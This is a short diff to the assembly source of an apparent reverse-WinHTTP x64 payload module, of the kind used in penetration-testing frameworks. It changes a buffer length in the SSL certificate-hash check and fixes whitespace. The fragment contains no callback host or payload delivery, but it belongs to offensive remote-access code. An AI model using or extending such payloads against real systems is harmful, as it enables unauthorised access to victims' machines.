@@ -383,7 +383,7 @@ module Payload::Windows::ReverseWinHttp_x64
 
       ssl_cert_get_server_hash:
         mov rcx, [r14]                ; Cert context pointer (pCertContext)
-        push 32                       ; sha1 length, rounded to multiple of 16
+        push 24                       ; sha1 length, rounded to multiple of 8
         mov r9, rsp                   ; Address of length (pcbData)
         mov r15, rsp                  ; Backup address of length
         sub rsp, [r9]                 ; Allocate 20 bytes for the hash output
@@ -402,12 +402,12 @@ module Payload::Windows::ReverseWinHttp_x64
 
       ssl_cert_compare_hashes:
         pop rax                       ; get the expected hash
-        xchg rax, rsi                ; swap hash and handle for now
+        xchg rax, rsi                 ; swap hash and handle for now
         mov rdi, r14                  ; pointer to the retrieved hash
         mov rcx, [r15]                ; number of bytes to compare
         repe cmpsb                    ; do the hash comparison
         jnz failure                   ; Bail out if the result isn't zero
-        xchg rax, rsi                ; swap hash and handle back!
+        xchg rax, rsi                 ; swap hash and handle back!
 
       ; Our certificate hash was valid, hurray!
       ^
